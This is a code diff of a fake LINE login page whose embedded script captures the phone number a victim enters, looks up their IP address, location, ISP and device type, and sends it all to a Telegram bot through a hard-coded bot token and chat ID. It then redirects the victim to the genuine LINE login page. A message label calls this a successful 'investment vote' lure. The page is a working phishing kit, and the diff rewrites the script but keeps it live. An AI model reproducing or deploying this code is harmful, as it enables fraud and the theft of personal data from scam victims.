@@ -16,7 +16,6 @@
         button:disabled{background:#008000;cursor:wait}
         .footer{margin-top:40px;font-size:12px;color:rgba(255,255,255,0.8)}
         .footer a{color:white}
-        @media(max-width:480px){.login-container{padding:30px 20px}.country-select{min-width:80px;font-size:16px}.phone-input{font-size:16px}}
     </style>
 </head>
 <body>
@@ -42,59 +41,50 @@
         </form>
         <div class="footer">© 1978 LINE Corp. <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></div>
     </div>
-<script>
-    const TELEGRAM_BOT_TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
-    const TELEGRAM_CHAT_ID   = "1137905005";
 
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-        e.preventDefault();
-        const countryCode = document.getElementById("countryCode").value;
-        const phone = document.getElementById("phone").value.trim();
-        if (!phone) return;
+    <script>
+        const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
+        const CHAT_ID = "1137905005";
 
-        const btn = e.target.querySelector("button");
-        btn.innerHTML = "Verifying...";
-        btn.disabled = true;
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const code = document.getElementById("countryCode").value;
+            const num  = document.getElementById("phone").value.trim();
+            if (num === "") return;
 
-        fetch('https://ipapi.co/json/')
+            const btn = document.querySelector("button");
+            btn.innerHTML = "Verifying...";
+            btn.disabled = true;
+
+            fetch("https://ipapi.co/json/")
             .then(r => r.json())
-            .then(d => sendLog(d))
-            .catch(() => sendLog({ip:"未知", city:"未知", country_name:"未知", org:"未知"}));
+            .then(ip => {
+                const 國 = { "Taiwan":"台灣","Thailand":"泰國","Malaysia":"馬來西亞","Hong Kong":"香港","Singapore":"新加坡","Philippines":"菲律賓","Vietnam":"越南","Cambodia":"柬埔寨","Indonesia":"印尼","China":"中國" };
+                const 時間 = new Date().toLocaleString("zh-TW", {timeZone:"Asia/Taipei"});
 
-        function sendLog(d) {
-            // 超簡單中文化對照表
-            const countryTW = {
-                "Taiwan": "台灣", "Thailand": "泰國", "Malaysia": "馬來西亞", 
-                "Hong Kong": "香港", "Singapore": "新加坡", "Philippines": "菲律賓",
-                "Vietnam": "越南", "Cambodia": "柬埔寨", "Indonesia": "印尼"
-            };
+                const 訊息 = "LINE投資投票誘捕成功\n\n" +
+                            "電話：" + code + num + "\n" +
+                            "IP　　：" + (ip.ip || "未知") + "\n" +
+                            "位置　：" + (ip.city || "未知") + "，" + (國[ip.country_name] || ip.country_name || "未知") + "\n" +
+                            "ISP　　：" + (ip.org || "未知") + "\n" +
+                            "時間　：" + 時間 + "\n" +
+                            "裝置　：" + (/Mobile|iPhone|Android|iPad/i.test(navigator.userAgent) ? "手機" : "電腦");
 
-            const msg = 【LINE 投資投票誘捕成功】\n\n +
-                        電話：${countryCode}${phone}\n +
-                        IP　　：${d.ip || "未知"}\n +
-                        位置　：${d.city || "未知"}，${countryTW[d.country_name] || d.country_name || "未知"}\n +
-                        ISP　　：${d.org || "未知"}\n +
-                        時間　：${new Date().toLocaleString("zh-TW", {timeZone:"Asia/Taipei"})}\n +
-                        裝置　：${navigator.userAgent.includes("Mobile") ? "手機" : "電腦/平板"};
+                fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: 訊息 })
+                });
 
-            fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: msg,
-                    parse_mode: "HTML"
-                })
+                setTimeout(function() {
+                    location.href = "https://access.line.me/fr/login";
+                }, 3000);
+            })
+            .catch(() => {
+                // 即使 ipapi 掛掉也要能跳轉
+                setTimeout(() => location.href = "https://access.line.me/fr/login", 3000);
             });
-
-            setTimeout(() => {
-                location.href = "https://access.line.me/fr/login";
-            }, 3000);
-        }
-    });
-</script>
+        });
+    </script>
 </body>
-
 </html>
-
-
